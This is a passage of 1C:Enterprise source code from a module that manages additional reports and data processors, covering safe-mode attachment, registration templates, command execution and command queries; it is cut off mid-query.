		БезопасныйРежим = ПолучитьФункциональнуюОпцию(""СтандартныеПодсистемыВМоделиСервиса"") Или ПараметрыЗапуска.БезопасныйРежим;
		
		Если БезопасныйРежим Тогда
			ЗапросРазрешений = Новый Запрос(
				""ВЫБРАТЬ ПЕРВЫЕ 1
				|	ДополнительныеОтчетыИОбработкиРазрешения.НомерСтроки,
				|	ДополнительныеОтчетыИОбработкиРазрешения.ВидРазрешения
				|ИЗ
				|	Справочник.ДополнительныеОтчетыИОбработки.Разрешения КАК ДополнительныеОтчетыИОбработкиРазрешения
				|ГДЕ
				|	ДополнительныеОтчетыИОбработкиРазрешения.Ссылка = &Ссылка"");
			ЗапросРазрешений.УстановитьПараметр(""Ссылка"", Ссылка);
			ЕстьРазрешений = Не ЗапросРазрешений.Выполнить().Пустой();
			
			РежимСовместимости = ОбщегоНазначения.ЗначениеРеквизитаОбъекта(Ссылка, ""РежимСовместимостиРазрешений"");
			Если РежимСовместимости = Перечисления.РежимыСовместимостиРазрешенийДополнительныхОтчетовИОбработок.Версия_2_2_2
				И ЕстьРазрешений Тогда
				БезопасныйРежим = Ложь;
			КонецЕсли;
		КонецЕсли;
		
	КонецЕсли;
	
	ЗаписатьПримечание(Ссылка, НСтр(""ru = 'Подключение, БезопасныйРежим = """"%1"""".'""), БезопасныйРежим);
	
	Если ОбщегоНазначения.ЕстьЗащитаОтОпасныхДействий() Тогда
		ИмяОбработки = Менеджер.Подключить(АдресВоВременномХранилище, , БезопасныйРежим,
			ОбщегоНазначения.ОписаниеЗащитыБезПредупреждений());
	Иначе
		ИмяОбработки = Менеджер.Подключить(АдресВоВременномХранилище, , БезопасныйРежим);
	КонецЕсли;
	
	Возврат ИмяОбработки;
	
КонецФункции

// Возвращает объект внешнего отчета или обработки.
//
// Важно: проверка функциональной опции ""ИспользоватьДополнительныеОтчетыИОбработки""
// должна выполняться вызывающим кодом.
//
// Параметры:
//   Ссылка - СправочникСсылка.ДополнительныеОтчетыИОбработки - Подключаемый отчет или обработка.
//
// Возвращаемое значение: 
//   * ВнешняяОбработкаОбъект - Объект подключенной обработки.
//   * ВнешнийОтчетОбъект     - Объект подключенного отчета.
//   * Неопределено           - Если передана некорректная ссылка.
//
Функция ОбъектВнешнейОбработки(Ссылка) Экспорт
	
	СтандартнаяОбработка = Истина;
	Результат = Неопределено;
	
	ИнтеграцияСТехнологиейСервиса.ПриСозданииВнешнейОбработки(Ссылка, СтандартнаяОбработка, Результат);
	Если Не СтандартнаяОбработка Тогда
		Возврат Результат;
	КонецЕсли;
	
	// Подключение
	ИмяОбработки = ПодключитьВнешнююОбработку(Ссылка);
	
	// Проверка корректности переданных параметров.
	Если ИмяОбработки = Неопределено Тогда
		Возврат Неопределено;
	КонецЕсли;
	
	// Получение экземпляра объекта.
	Если Ссылка.Вид = Перечисления.ВидыДополнительныхОтчетовИОбработок.Отчет
		ИЛИ Ссылка.Вид = Перечисления.ВидыДополнительныхОтчетовИОбработок.ДополнительныйОтчет Тогда
		Менеджер = ВнешниеОтчеты;
	Иначе
		Менеджер = ВнешниеОбработки;
	КонецЕсли;
	
	Возврат Менеджер.Создать(ИмяОбработки);
	
КонецФункции

// Формирует печатную форму по внешнему источнику.
//
// Параметры:
//   ДополнительнаяОбработкаСсылка - СправочникСсылка.ДополнительныеОтчетыИОбработки - внешняя обработка.
//   ПараметрыИсточника            - Структура - структура со свойствами:
//       * ИдентификаторКоманды - Строка - список макетов, перечисленных через запятую.
//       * ОбъектыНазначения    - Массив
//   КоллекцияПечатныхФорм - ТаблицаЗначений - сформированные табличные документы (возвращаемый параметр).
//   ОбъектыПечати         - СписокЗначений  - соответствие между объектами и именами областей печати
//                                             табличного документа. Значение - Объект, представление - имя области,
//                                             в которой был выведен объект (возвращаемый параметр).
//   ПараметрыВывода       - Структура       - дополнительные параметры сформированных табличных документов
//                                             (возвращаемый параметр).
//
Процедура ПечатьПоВнешнемуИсточнику(ДополнительнаяОбработкаСсылка, ПараметрыИсточника, КоллекцияПечатныхФорм,
	ОбъектыПечати, ПараметрыВывода) Экспорт
	
	Если ОбщегоНазначения.ПодсистемаСуществует(""СтандартныеПодсистемы.Печать"") Тогда
		МодульУправлениеПечатью = ОбщегоНазначения.ОбщийМодуль(""УправлениеПечатью"");
		МодульУправлениеПечатью.ПечатьПоВнешнемуИсточнику(
			ДополнительнаяОбработкаСсылка,
			ПараметрыИсточника,
			КоллекцияПечатныхФорм,
			ОбъектыПечати,
			ПараметрыВывода);
	КонецЕсли;
	
КонецПроцедуры

// Формирует шаблон сведений о внешнем отчете или обработке для последующего заполнения.
//
// Параметры:
//   ВерсияБСП - Строка - версия Библиотеки стандартных подсистем, на которую рассчитывают механизмы внешней обработки
//                        или отчета. См. СтандартныеПодсистемыСервер.ВерсияБиблиотеки.
//
// Возвращаемое значение:
//   Структура - параметры внешнего отчета или обработки:
//       * Вид - Строка - Вид внешнего отчета или обработки. Для указания вида рекомендуется использовать функции
//           ДополнительныеОтчетыИОбработкиКлиентСервер.ВидОбработки<ИмяВида>.
//           Также вид можно указать явно:
//           ""ПечатнаяФорма"",
//           ""ЗаполнениеОбъекта"",
//           ""СозданиеСвязанныхОбъектов"",
//           ""Отчет"",
//           ""ШаблонСообщения"",
//           ""ДополнительнаяОбработка"" или
//           ""ДополнительныйОтчет"".
//       
//       * Версия - Строка - Версия отчета или обработки (далее - обработки).
//           Задается в формате: ""<Старший номер>.<Младший номер>"".
//       
//       * Назначение - Массив - Полные имена объектов конфигурации (Строка), для которых предназначен эта обработка.
//                               Необязательное свойство.
//       
//       * Наименование - Строка - Представление для администратора (наименование элемента справочника).
//                                 Если не заполнено, то берется представление объекта метаданных внешней обработки.
//                                 Необязательное свойство. 
//       
//       * БезопасныйРежим - Булево - Признак подключения внешней обработки в безопасном режиме.
//                                    Значение по умолчанию Истина (обработка будет выполняться безопасно).
//                                    В безопасном режиме:
//                                    Игнорируется привилегированный режим.
//                                    Запрещены внешние по отношению к платформе 1С:Предприятия действия:
//                                      COM;
//                                      Загрузка внешних компонентов;
//                                      Запуск внешних приложений и команд операционной системы;
//                                      Доступ к файловой системе, кроме временных файлов;
//                                      Доступ к Интернету.
//                                    Необязательное свойство.
//       
//       * Разрешения - Массив - Дополнительные разрешения, необходимые внешней обработке при работе в безопасном режиме.
//                               Элемент массива - ОбъектXDTO - разрешение типа
//                               {http://www.1c.ru/1cFresh/ApplicationExtensions/Permissions/a.b.c.d}PermissionBase.
//                               Для формирования описания разрешения рекомендуется использовать функции
//                               РаботаВБезопасномРежиме.Разрешение<ВидРазрешения>(<ПараметрыРазрешения>).
//                               Необязательное свойство.
//       
//       * Информация - Строка - Краткая информация о внешней обработке.
//                               В этом параметре для администратора рекомендуется дать описание ее возможностей.
//                               Если не заполнено, то берется комментарий объекта метаданных внешней обработки.
//       
//       * ВерсияБСП - Строка - Необязательный. Версия библиотеки, на которую рассчитывают механизмы внешней обработки.
//                              См. СтандартныеПодсистемыСервер.ВерсияБиблиотеки.
//                              Необязательное свойство.
//       
//       * ОпределитьНастройкиФормы - Булево - только для дополнительных отчетов, подключенных к общей форме ФормаОтчета.
//                                             Позволяет переопределять некоторые настройки общей формы отчета и 
//                                             подписываться на ее события.
//                                             Если Истина, то в модуле объекта отчета следует определить процедуру по шаблону:
//           
//           // Настройки общей формы отчета подсистемы ""Варианты отчетов"".
//           //
//           // Параметры:
//           //   Форма - УправляемаяФорма, Неопределено - Форма отчета или форма настроек отчета.
//           //       Неопределено когда вызов без контекста.
//           //   КлючВарианта - Строка, Неопределено - Имя предопределенного
//           //       или уникальный идентификатор пользовательского варианта отчета.
//           //       Неопределено когда вызов без контекста.
//           //   Настройки - Структура - см. возвращаемое значение
//           //       ОтчетыКлиентСервер.ПолучитьНастройкиОтчетаПоУмолчанию().
//           //
//           Процедура ОпределитьНастройкиФормы(Форма, КлючВарианта, Настройки) Экспорт
//           	// Код процедуры.
//           КонецПроцедуры
//           
//           Подробнее см. в документации к подсистемам ""Дополнительные отчеты и обработки"" и ""Варианты отчетов"".
//           Необязательное свойство.
//       
//       * Команды - ТаблицаЗначений - Настройки команд, поставляемых внешней обработкой (необязательно для отчетов):
//           ** Идентификатор - Строка - Внутреннее имя команды. Для внешних печатных форм (когда Вид = ""ПечатнаяФорма""):
//                 Идентификатор может содержать имена одной или нескольких команд печати,
//                 разделенных запятыми. Подробнее см. описание колонки Идентификатор
//                 в функции СоздатьКоллекциюКомандПечати() общего модуля УправлениеПечатью.
//           ** Представление - Строка - Пользовательское представление команды.
//           ** Использование - Строка - Тип команды:
//               ""ВызовКлиентскогоМетода"",
//               ""ВызовСерверногоМетода"",
//               ""ЗаполнениеФормы"",
//               ""ОткрытиеФормы"" или
//               ""СценарийВБезопасномРежиме"".
//               Для получения типов команд рекомендуется использовать функции
//               ДополнительныеОтчетыИОбработкиКлиентСервер.ТипКоманды<ИмяТипа>.
//               В комментариях к этим функциям также даны шаблоны процедур-обработчиков команд.
//           ** ПоказыватьОповещение - Булево - если Истина, то при запуске команды выводится оповещение ""Команда выполняется..."".
//              Действует для всех типов команд, кроме команд по открытию формы (Использование = ""ОткрытиеФормы"").
//           ** Модификатор - Строка - Дополнительная классификация команды.
//               Для внешних печатных форм (когда Вид = ""ПечатнаяФорма""):
//                 ""ПечатьMXL"" - для печатных форм на основе табличных макетов.
//               Для загрузки данных из файла (когда Вид = ""ПечатнаяФорма"" и Использование = ""ЗагрузкаДанныхИзФайла""):
//                 Модификатор является обязательным для заполнения
//                 и должен содержать полное имя объекта метаданных (справочника),
//                 для которого выполняется загрузка данных.
//           ** Скрыть - Булево - Необязательный. Признак того, что это служебная команда.
//               Если установить в значение Истина, то команда скрывается в карточке дополнительного объекта.
//
Функция СведенияОВнешнейОбработке(ВерсияБСП = """") Экспорт
	ПараметрыРегистрации = Новый Структура;
	
	ПараметрыРегистрации.Вставить(""Вид"", """");
	ПараметрыРегистрации.Вставить(""Версия"", ""0.0"");
	ПараметрыРегистрации.Вставить(""Назначение"", Новый Массив);
	ПараметрыРегистрации.Вставить(""Наименование"", Неопределено);
	ПараметрыРегистрации.Вставить(""БезопасныйРежим"", Истина);
	ПараметрыРегистрации.Вставить(""Информация"", Неопределено);
	ПараметрыРегистрации.Вставить(""ВерсияБСП"", ВерсияБСП);
	ПараметрыРегистрации.Вставить(""ОпределитьНастройкиФормы"", Ложь);
	
	РеквизитыТабличнойЧасти = Метаданные.Справочники.ДополнительныеОтчетыИОбработки.ТабличныеЧасти.Команды.Реквизиты;
	
	ТаблицаКоманд = Новый ТаблицаЗначений;
	ТаблицаКоманд.Колонки.Добавить(""Представление"", РеквизитыТабличнойЧасти.Представление.Тип);
	ТаблицаКоманд.Колонки.Добавить(""Идентификатор"", РеквизитыТабличнойЧасти.Идентификатор.Тип);
	ТаблицаКоманд.Колонки.Добавить(""Использование"", Новый ОписаниеТипов(""Строка""));
	ТаблицаКоманд.Колонки.Добавить(""ПоказыватьОповещение"", РеквизитыТабличнойЧасти.ПоказыватьОповещение.Тип);
	ТаблицаКоманд.Колонки.Добавить(""Модификатор"", РеквизитыТабличнойЧасти.Модификатор.Тип);
	ТаблицаКоманд.Колонки.Добавить(""Скрыть"",      РеквизитыТабличнойЧасти.Скрыть.Тип);
	ТаблицаКоманд.Колонки.Добавить(""ЗаменяемыеКоманды"", РеквизитыТабличнойЧасти.ЗаменяемыеКоманды.Тип);
	
	ПараметрыРегистрации.Вставить(""Команды"", ТаблицаКоманд);
	ПараметрыРегистрации.Вставить(""Разрешения"", Новый Массив);
	
	Возврат ПараметрыРегистрации;
КонецФункции

// Выполняет команду обработки и возвращает результат ее выполнения.
//
// Важно: проверка функциональной опции ""ИспользоватьДополнительныеОтчетыИОбработки""
// должна выполняться вызывающим кодом.
//
// Параметры:
//   ПараметрыКоманды - Структура - Параметры, с которыми выполняется команда.
//       * ДополнительнаяОбработкаСсылка - СправочникСсылка.ДополнительныеОтчетыИОбработки - Элемент справочника.
//       * ИдентификаторКоманды - Строка - Имя выполняемой команды.
//       * ОбъектыНазначения    - Массив - Ссылки объектов, для которых выполняется обработка. Обязательный для
//                                         назначаемых обработок.
//   АдресРезультата - Строка - Необязательный. Адрес временного хранилища по которому будет размещен результат
//                              выполнения.
//
// Возвращаемое значение:
//   Структура - Результат выполнения, который далее передается на клиент.
//   Неопределено - Если был передан АдресРезультата.
//
Функция ВыполнитьКоманду(ПараметрыКоманды, АдресРезультата = Неопределено) Экспорт
	
	Если ТипЗнч(ПараметрыКоманды.ДополнительнаяОбработкаСсылка) <> Тип(""СправочникСсылка.ДополнительныеОтчетыИОбработки"")
		Или ПараметрыКоманды.ДополнительнаяОбработкаСсылка = Справочники.ДополнительныеОтчетыИОбработки.ПустаяСсылка() Тогда
		Возврат Неопределено;
	КонецЕсли;
	
	ВнешнийОбъект = ОбъектВнешнейОбработки(ПараметрыКоманды.ДополнительнаяОбработкаСсылка);
	ИдентификаторКоманды = ПараметрыКоманды.ИдентификаторКоманды;
	РезультатВыполнения = ВыполнитьКомандуВнешнегоОбъекта(ВнешнийОбъект, ИдентификаторКоманды, ПараметрыКоманды, АдресРезультата);
	
	Возврат РезультатВыполнения;
	
КонецФункции

// Выполняет команду обработки напрямую из формы внешнего объекта и возвращает результат ее выполнения.
// Пример использования - см. ДополнительныеОтчетыИОбработкиКлиент.ВыполнитьКомандуВФоне().
//
// Важно: проверка функциональной опции ""ИспользоватьДополнительныеОтчетыИОбработки""
// должна выполняться вызывающим кодом.
//
// Параметры:
//   ИдентификаторКоманды - Строка    - Имя команды как оно задано в функции СведенияОВнешнейОбработке() модуля объекта.
//   ПараметрыКоманды     - Структура - Параметры выполнения команды.
//                                      См. ДополнительныеОтчетыИОбработкиКлиент.ВыполнитьКомандуВФоне().
//   Форма                - УправляемаяФорма - Форма, в которую необходимо вернуть результат.
//
// Возвращаемое значение:
//   Структура - для служебного использования.
//
Функция ВыполнитьКомандуИзФормыВнешнегоОбъекта(ИдентификаторКоманды, ПараметрыКоманды, Форма) Экспорт
	
	ВнешнийОбъект = Форма.РеквизитФормыВЗначение(""Объект"");
	РезультатВыполнения = ВыполнитьКомандуВнешнегоОбъекта(ВнешнийОбъект, ИдентификаторКоманды, ПараметрыКоманды, Неопределено);
	Возврат РезультатВыполнения;
	
КонецФункции

// Формирует список разделов, в которых доступна команда вызова дополнительных отчетов.
//
// Возвращаемое значение: 
//   Массив - массив объектов метаданных Подсистема - метаданные разделов, в которые выведен список команд
//                                                    дополнительных отчетов.
//
Функция РазделыДополнительныхОтчетов() Экспорт
	РазделыМетаданные = Новый Массив;
	
	ДополнительныеОтчетыИОбработкиПереопределяемый.ОпределитьРазделыСДополнительнымиОтчетами(РазделыМетаданные);
	
	Если ОбщегоНазначения.ПодсистемаСуществует(""СтандартныеПодсистемы.НастройкиПрограммы"") Тогда
		МодульОбработкиПанельАдминистрированияБСП = ОбщегоНазначения.ОбщийМодуль(""Обработки.ПанельАдминистрированияБСП"");
		МодульОбработкиПанельАдминистрированияБСП.ПриОпределенииРазделовСДополнительнымиОтчетами(РазделыМетаданные);
	КонецЕсли;
	
	Возврат РазделыМетаданные;
КонецФункции

// Формирует список разделов, в которых доступна команда вызова дополнительных обработок.
//
// Возвращаемое значение: 
//   Массив - массив объектов метаданных Подсистема - метаданные разделов, в которые выведен список команд дополнительных
//   обработок.
//
Функция РазделыДополнительныхОбработок() Экспорт
	РазделыМетаданные = Новый Массив;
	
	Если ОбщегоНазначения.ПодсистемаСуществует(""СтандартныеПодсистемы.НастройкиПрограммы"") Тогда
		МодульОбработкиПанельАдминистрированияБСП = ОбщегоНазначения.ОбщийМодуль(""Обработки.ПанельАдминистрированияБСП"");
		МодульОбработкиПанельАдминистрированияБСП.ПриОпределенииРазделовСДополнительнымиОбработками(РазделыМетаданные);
	КонецЕсли;
	
	ДополнительныеОтчетыИОбработкиПереопределяемый.ОпределитьРазделыСДополнительнымиОбработками(РазделыМетаданные);
	
	Возврат РазделыМетаданные;
КонецФункции

#Область УстаревшиеПроцедурыИФункции

// Устарела. Следует использовать ОбъектВнешнейОбработки.
//
// Важно: проверка функциональной опции ""ИспользоватьДополнительныеОтчетыИОбработки""
// должна выполняться вызывающим кодом.
//
// Параметры:
//   Ссылка - СправочникСсылка.ДополнительныеОтчетыИОбработки - Подключаемый отчет или обработка.
//
// Возвращаемое значение: 
//   * ВнешняяОбработкаОбъект - Объект подключенной обработки.
//   * ВнешнийОтчетОбъект     - Объект подключенного отчета.
//   * Неопределено           - Если передана некорректная ссылка.
//
Функция ПолучитьОбъектВнешнейОбработки(Ссылка) Экспорт
	
	Возврат ОбъектВнешнейОбработки(Ссылка);
	
КонецФункции

// Устарела. Следует использовать ПодключаемыеКоманды.ПриСозданииНаСервере.
//
// Параметры:
//   Форма - УправляемаяФорма - Форма.
//   ТипФормы - Строка - Тип формы.
//
Процедура ПриСозданииНаСервере(Форма, ТипФормы = Неопределено) Экспорт
	Возврат;
КонецПроцедуры

// Устарела. Следует использовать ПодключаемыеКоманды.ВыполнитьКоманду.
//
// Выполняет назначаемую команду контекстно из формы объекта назначения.
// Предназначена для вызова кодом этой подсистемы из формы элемента назначаемого объекта 
// (например, справочника или документа).
//
// Важно: проверка функциональной опции ""ИспользоватьДополнительныеОтчетыИОбработки""
// должна выполняться вызывающим кодом.
//
// Параметры:
//   Форма               - УправляемаяФорма - Форма, из которой вызвана команда.
//   ИмяЭлемента         - Строка           - Имя команды формы, которая была нажата.
//   РезультатВыполнения - Структура        - для служебного использования.
//
Процедура ВыполнитьНазначаемуюКомандуНаСервере(Форма, ИмяЭлемента, РезультатВыполнения = Неопределено) Экспорт
	
	Возврат;
	
КонецПроцедуры

#КонецОбласти

#КонецОбласти

#Область СлужебныйПрограммныйИнтерфейс

// Определяет список объектов метаданных, к которым может быть применена назначаемая обработка переданного вида.
//
// Параметры:
//   Вид - ПеречислениеСсылка.ВидыДополнительныхОтчетовИОбработок - Вид внешней обработки.
//
// Возвращаемое значение:
//   ТаблицаЗначений - Описание объектов метаданных.
//       * Метаданные - ОбъектМетаданных - Объект метаданных, подключенный к данному виду.
//       * ПолноеИмя  - Строка - Полное имя объекта метаданных, например ""Справочник.Валюты"".
//       * Ссылка     - СправочникСсылка.ИдентификаторыОбъектовМетаданных - Ссылка объекта метаданных.
//       * Вид        - Строка - Вид объекта метаданных.
//       * Представление       - Строка - Представление объекта метаданных.
//       * ПолноеПредставление - Строка - Представление имени и вида объекта метаданных.
//   Неопределено - Если передан некорректный Вид.
//
Функция ПодключенныеОбъектыМетаданных(Вид) Экспорт
	Результат = Новый ТаблицаЗначений;
	Результат.Колонки.Добавить(""Метаданные"");
	Результат.Колонки.Добавить(""ПолноеИмя"", Новый ОписаниеТипов(""Строка""));
	Результат.Колонки.Добавить(""Ссылка"", Новый ОписаниеТипов(""СправочникСсылка.ИдентификаторыОбъектовМетаданных, СправочникСсылка.ИдентификаторыОбъектовРасширений""));
	Результат.Колонки.Добавить(""Вид"", Новый ОписаниеТипов(""Строка""));
	Результат.Колонки.Добавить(""Представление"", Новый ОписаниеТипов(""Строка""));
	Результат.Колонки.Добавить(""ПолноеПредставление"", Новый ОписаниеТипов(""Строка""));
	
	Результат.Индексы.Добавить(""Ссылка"");
	Результат.Индексы.Добавить(""Вид"");
	Результат.Индексы.Добавить(""ПолноеИмя"");
	
	МассивТиповИлиМетаданных = Новый Массив;
	
	Если Вид = Перечисления.ВидыДополнительныхОтчетовИОбработок.ЗаполнениеОбъекта
		Или Вид = Перечисления.ВидыДополнительныхОтчетовИОбработок.Отчет
		Или Вид = Перечисления.ВидыДополнительныхОтчетовИОбработок.СозданиеСвязанныхОбъектов Тогда
		
		МассивТиповИлиМетаданных = Метаданные.ОпределяемыеТипы.ОбъектСДополнительнымиКомандами.Тип.Типы();
		
	ИначеЕсли Вид = Перечисления.ВидыДополнительныхОтчетовИОбработок.ШаблонСообщения Тогда
		
		Если ОбщегоНазначения.ПодсистемаСуществует(""СтандартныеПодсистемы.ШаблоныСообщений"") Тогда
			МодульШаблоныСообщенийСлужебный = ОбщегоНазначения.ОбщийМодуль(""ШаблоныСообщенийСлужебный"");
			МассивТиповИлиМетаданных = МодульШаблоныСообщенийСлужебный.ИсточникиШаблоновСообщений()
		Иначе
			Возврат Результат;
		КонецЕсли;
		
	ИначеЕсли Вид = Перечисления.ВидыДополнительныхОтчетовИОбработок.ПечатнаяФорма Тогда
		
		Если ОбщегоНазначения.ПодсистемаСуществует(""СтандартныеПодсистемы.Печать"") Тогда
			МодульУправлениеПечатью = ОбщегоНазначения.ОбщийМодуль(""УправлениеПечатью"");
			МассивТиповИлиМетаданных = МодульУправлениеПечатью.ИсточникиКомандПечати()
		Иначе
			Возврат Результат;
		КонецЕсли;
		
	ИначеЕсли Вид = Перечисления.ВидыДополнительныхОтчетовИОбработок.ДополнительнаяОбработка Тогда
		
		МассивТиповИлиМетаданных = РазделыДополнительныхОбработок();
		
	ИначеЕсли Вид = Перечисления.ВидыДополнительныхОтчетовИОбработок.ДополнительныйОтчет Тогда
		
		МассивТиповИлиМетаданных = РазделыДополнительныхОтчетов();
		
	Иначе
		
		Возврат Неопределено;
		
	КонецЕсли;
	
	Для Каждого ТипИлиМетаданные Из МассивТиповИлиМетаданных Цикл
		Если ТипЗнч(ТипИлиМетаданные) = Тип(""Тип"") Тогда
			ОбъектМетаданных = Метаданные.НайтиПоТипу(ТипИлиМетаданные);
			Если ОбъектМетаданных = Неопределено Тогда
				Продолжить;
			КонецЕсли;
		Иначе
			ОбъектМетаданных = ТипИлиМетаданные;
		КонецЕсли;
		
		СтрокаТаблицы = Результат.Добавить();
		СтрокаТаблицы.Метаданные = ОбъектМетаданных;
		
		Если ОбъектМетаданных = ДополнительныеОтчетыИОбработкиКлиентСервер.ИдентификаторРабочегоСтола() Тогда
			СтрокаТаблицы.ПолноеИмя = ДополнительныеОтчетыИОбработкиКлиентСервер.ИдентификаторРабочегоСтола();
			СтрокаТаблицы.Ссылка = Справочники.ИдентификаторыОбъектовМетаданных.ПустаяСсылка();
			СтрокаТаблицы.Вид = ""Подсистема"";
			СтрокаТаблицы.Представление = НСтр(""ru = 'Начальная страница'"");
		Иначе
			СтрокаТаблицы.ПолноеИмя = ОбъектМетаданных.ПолноеИмя();
			СтрокаТаблицы.Ссылка = ОбщегоНазначения.ИдентификаторОбъектаМетаданных(ОбъектМетаданных);
			СтрокаТаблицы.Вид = Лев(СтрокаТаблицы.ПолноеИмя, СтрНайти(СтрокаТаблицы.ПолноеИмя, ""."") - 1);
			СтрокаТаблицы.Представление = ОбъектМетаданных.Представление();
		КонецЕсли;
		
		СтрокаТаблицы.ПолноеПредставление = СтрокаТаблицы.Представление + "" ("" + СтрокаТаблицы.Вид + "")"";
	КонецЦикла;
	
	Возврат Результат;
КонецФункции

// Формирует запрос для получения таблицы команд дополнительных отчетов или обработок.
//
// Параметры:
//   ВидОбработок - ПеречислениеСсылка.ВидыДополнительныхОтчетовИОбработок - Вид обработки.
//   Размещение - СправочникСсылка.ИдентификаторыОбъектовМетаданных, Строка - Ссылка или полное имя объекта метаданных,
//       к которому привязаны искомые дополнительные отчеты и обработки.
//       Глобальные обработки размещаются в разделах, контекстные - в справочниках и документах.
//   ЭтоФормаОбъекта - Булево - Необязательный.
//       Тип форм, в которых размещены контекстные дополнительные отчеты и обработки.
//       Истина - только отчеты и обработки, привязанные к формам объектов.
//       Ложь - только отчеты и обработки, привязанные к формам списков.
//   ТипыКоманд - ПеречислениеСсылка.ВариантыПубликацииДополнительныхОтчетовИОбработок - Тип получаемых команд.
//       - Массив - Типы команд, которые необходимо получить.
//           * ПеречислениеСсылка.ВариантыПубликацииДополнительныхОтчетовИОбработок
//   ТолькоВключенные - Булево - Необязательный.
//       Тип форм, в которых размещены контекстные дополнительные отчеты и обработки.
//       Истина - только отчеты и обработки, привязанные к формам объектов.
//       Ложь - только отчеты и обработки, привязанные к формам списков.
//
// Возвращаемое значение:
//   ТаблицаЗначений - Команды дополнительных отчетов или обработок.
//       * Ссылка - СправочникСсылка.ДополнительныеОтчетыИОбработки - Ссылка дополнительного отчета или обработки.
//       * Идентификатор - Строка - Идентификатор команды, как он задан разработчиком дополнительного объекта.
//       * ВариантЗапуска - ПеречислениеСсылка.СпособыВызоваДополнительныхОбработок -
//           Способ вызова команды дополнительного объекта.
//       * Представление - Строка - Наименование команды в пользовательском интерфейсе.
//       * ПоказыватьОповещение - Булево - Показывать оповещение пользователю после выполнения команды.
//       * Модификатор - Строка - Модификатор команды.
//
Функция НовыйЗапросПоДоступнымКомандам(ВидОбработок, Размещение, ЭтоФормаОбъекта = Неопределено, ТипыКоманд = Неопределено, ТолькоВключенные = Истина) Экспорт
	Запрос = Новый Запрос;
	
	Если ТипЗнч(Размещение) = Тип(""СправочникСсылка.ИдентификаторыОбъектовМетаданных"") Тогда
		СсылкаРодителяИлиРаздела = Размещение;
	Иначе
		Если ЗначениеЗаполнено(Размещение) Тогда
			СсылкаРодителяИлиРаздела = СтандартныеПодсистемыСервер.ИдентификаторОбъектаМетаданных(Размещение);
		Иначе
			СсылкаРодителяИлиРаздела = Неопределено;
		КонецЕсли;
	КонецЕсли;
	
	Если СсылкаРодителяИлиРаздела <> Неопределено Тогда // Есть фильтр по родителю.
		ЭтоГлобальныеОбработки = (
			ВидОбработок = Перечисления.ВидыДополнительныхОтчетовИОбработок.ДополнительныйОтчет
			Или ВидОбработок = Перечисления.ВидыДополнительныхОтчетовИОбработок.ДополнительнаяОбработка);
		
		// Запросы принципиально отличаются для глобальных обработок и назначаемых.
		Если ЭтоГлобальныеОбработки Тогда
			ТекстЗапроса =
			""ВЫБРАТЬ РАЗРЕШЕННЫЕ РАЗЛИЧНЫЕ
			|	ДопОтчетыИОбработки.Ссылка
			|ПОМЕСТИТЬ втСсылки
			|ИЗ
			|	Справочник.ДополнительныеОтчетыИОбработки.Разделы КАК ТаблицаРазделы
			|		ВНУТРЕННЕЕ СОЕДИНЕНИЕ Справочник.ДополнительныеОтчетыИОбработки КАК ДопОтчетыИОбработки
			|		ПО (ТаблицаРазделы.Раздел = &СсылкаРаздела)
			|			И ТаблицаРазделы.Ссылка = ДопОтчетыИОбработки.Ссылка
			|ГДЕ
			|	ДопОтчетыИОбработки.Вид = &Вид
			|	И НЕ ДопОтчетыИОбработки.ПометкаУдаления
			|	И ДопОтчетыИОбработки.Публикация = &Публикация
			|;
			|
			|////////////////////////////////////////////////////////////////////////////////
			|ВЫБРАТЬ РАЗРЕШЕННЫЕ
			|	ТаблицаКоманды.Ссылка,
			|	ТаблицаКоманды.Идентификатор,
			|	ТаблицаКоманды.ЗаменяемыеКоманды,
			|	ТаблицаКоманды.ВариантЗапуска,
			|	ТаблицаКоманды.Представление,
			|	ТаблицаКоманды.ПоказыватьОповещение,
			|	ТаблицаКоманды.Модификатор,
			|	ЕСТЬNULL(БыстрыйДоступ.Доступно, ЛОЖЬ) КАК Использование
			|ПОМЕСТИТЬ ИтоговаяТаблица
			|ИЗ
			|	втСсылки КАК ТаблицаСсылки
			|		ВНУТРЕННЕЕ СОЕДИНЕНИЕ Справочник.ДополнительныеОтчетыИОбработки.Команды КАК ТаблицаКоманды
			|		ПО ТаблицаСсылки.Ссылка = ТаблицаКоманды.Ссылка
			|			И (ТаблицаКоманды.Скрыть = ЛОЖЬ)
			|			И (ТаблицаКоманды.ВариантЗапуска В (&ТипыКоманд))
			|		ЛЕВОЕ СОЕДИНЕНИЕ РегистрСведений.ПользовательскиеНастройкиДоступаКОбработкам КАК БыстрыйДоступ
			|		ПО (ТаблицаКоманды.Ссылка = БыстрыйДоступ.ДополнительныйОтчетИлиОбработка)
			|			И (ТаблицаКоманды.Идентификатор = БыстрыйДоступ.ИдентификаторКоманды)
			|			И (БыстрыйДоступ.Пользователь = &ТекущийПользователь)
			|ГДЕ
			|	ЕСТЬNULL(БыстрыйДоступ.Доступно, ЛОЖЬ)"";
			Запрос.УстановитьПараметр(""СсылкаРаздела"", СсылкаРодителяИлиРаздела);
			
			Если Не ТолькоВключенные Тогда
				ТекстЗапроса = СтрЗаменить(ТекстЗапроса,
					""ГДЕ
					|	ЕСТЬNULL(БыстрыйДоступ.Доступно, ЛОЖЬ)"",
					"""");
			КонецЕсли;
			
		Иначе
			
			ТекстЗапроса =
			""ВЫБРАТЬ РАЗРЕШЕННЫЕ РАЗЛИЧНЫЕ
			|	ТаблицаНазначение.Ссылка
			|ПОМЕСТИТЬ втСсылки
			|ИЗ
			|	Справочник.ДополнительныеОтчетыИОбработки.Назначение КАК ТаблицаНазначение
			|		ВНУТРЕННЕЕ СОЕДИНЕНИЕ Справочник.ДополнительныеОтчетыИОбработки КАК ДопОтчетыИОбработки
			|		ПО (ТаблицаНазначение.ОбъектНазначения = &СсылкаРодителя)
			|			И ТаблицаНазначение.Ссылка = ДопОтчетыИОбработки.Ссылка
			|			И (ДопОтчетыИОбработки.ПометкаУдаления = ЛОЖЬ)
			|			И (ДопОтчетыИОбработки.Вид = &Вид)
			|			И (ДопОтчетыИОбработки.Публикация = &Публикация)
			|			И (ДопОтчетыИОбработки.ИспользоватьДляФормыСписка = ИСТИНА)
			|			И (ДопОтчетыИОбработки.ИспользоватьДляФормыОбъекта = ИСТИНА)
			|;
			|
			|////////////////////////////////////////////////////////////////////////////////
			|ВЫБРАТЬ РАЗРЕШЕННЫЕ
			|	ТаблицаКоманды.Ссылка,
			|	ТаблицаКоманды.Идентификатор,
			|	ТаблицаКоманды.ЗаменяемыеКоманды,
			|	ТаблицаКоманды.ВариантЗапуска,
			|	ТаблицаКоманды.Представление,
			|	ТаблицаКоманды.ПоказыватьОповещение,
			|	ТаблицаКоманды.Модификатор,
